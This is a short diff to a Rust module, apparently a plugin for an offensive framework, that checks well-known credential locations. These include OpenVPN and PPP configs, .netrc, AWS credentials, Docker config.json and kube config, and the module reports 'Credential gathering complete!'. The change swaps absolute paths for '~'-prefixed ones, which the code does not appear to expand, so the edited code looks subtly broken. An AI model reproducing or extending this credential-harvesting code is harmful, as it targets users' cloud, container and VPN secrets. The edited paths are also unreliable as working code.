@@ -73,7 +73,7 @@ extern "C" fn run(_instance: *mut c_void, _config: *const c_char) -> c_int {
         "/etc/openvpn",
         "/etc/stunnel",
         "/etc/ppp",
-        "/.netrc",
+        "~/.netrc",
     ];
     for path in app_paths {
         check_file(path);
@@ -81,9 +81,9 @@ extern "C" fn run(_instance: *mut c_void, _config: *const c_char) -> c_int {
 
     // Browser saved passwords (requires specific tools)
     println!("\n[+] Common credential locations:");
-    check_file("/.aws/credentials");
-    check_file("/.docker/config.json");
-    check_file("/.kube/config");
+    check_file("~/.aws/credentials");
+    check_file("~/.docker/config.json");
+    check_file("~/.kube/config");
 
     println!("\n[*] Credential gathering complete!");
     0
